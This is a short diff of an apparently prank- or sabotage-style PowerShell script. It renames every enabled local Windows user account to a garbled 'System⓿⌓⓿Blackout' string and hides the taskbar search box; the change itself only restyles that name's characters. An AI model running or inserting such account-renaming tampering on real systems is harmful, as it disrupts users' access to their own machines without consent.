@@ -40,7 +40,7 @@ Set-ItemProperty -Path $searchBarPath -Name "SearchboxTaskbarMode" -Value 0
 # Change the user account names
 $users = Get-LocalUser | Where-Object {$_.Enabled -eq $true}
 foreach ($user in $users) {
-    $newName = "S̶̞̾͑̑͋̇̔̆y̸̝̝͖̝̳̜̦͛͒̿̿̃̏̈̿͝͝ͅs̶̬̳̖̗̤͑̀͑̏̉͝t̵̛̳̟̬̯͗͊͘͘ẹ̴̒͌̈́͛̍̈́̈̂̚m̸̡̠̍̔͋̕͠⓿⌓⓿B̷̧̬̙͍͉̙̭͓͂̔̌͗̓̈̍̇̈́̕l̶̨̲͍̭͇̱͕͗͒͂̽̕̕å̷̱̖̯c̶͖͕̗͔̦̫̫̳̐̋͊̔̾͒k̸̬̏́̈͂͂̽̚͝ō̸̧͈̠̤͙̲̬͚͈̂͊̾̄̽̍̐̇ͅū̸̢̻̣̺͇̮͈ṯ̶̡̬̇́͌̎̀̉̊̉̚͠"
+    $newName = "S̶y̶s̶t̶e̶m̶⓿⌓⓿B̶l̶a̶c̶k̶o̶u̶t̶"
     Rename-LocalUser -Name $user.Name -NewName $newName
 }
 
